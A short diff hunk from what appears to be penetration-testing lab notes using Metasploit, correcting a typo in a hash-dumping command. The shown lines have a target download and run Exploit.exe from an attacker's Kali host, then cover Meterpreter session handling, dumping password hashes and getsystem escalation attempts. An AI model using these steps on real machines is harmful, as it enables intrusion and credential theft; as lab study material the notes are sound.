@@ -82,7 +82,7 @@ open firefox http://<kali_ip>/share , download the Exploit.exe and run
 meterpreter > sessions -i [to list the current sessions opened]
 meterpreter > sessions <ID> [select the sessionID]
 getuid
-run post/windows/gather/smart_hashdum  [[-] Insufficient privileges to dump hashes!]
+run post/windows/gather/smart_hashdump  [[-] Insufficient privileges to dump hashes!]
 
 Try to escalate the privileges by issuing a getsystem command that attempts to elevate the user privileges.
 getsystem -t 1 [priv_elevate_getsystem: Operation failed: Access is denied.]
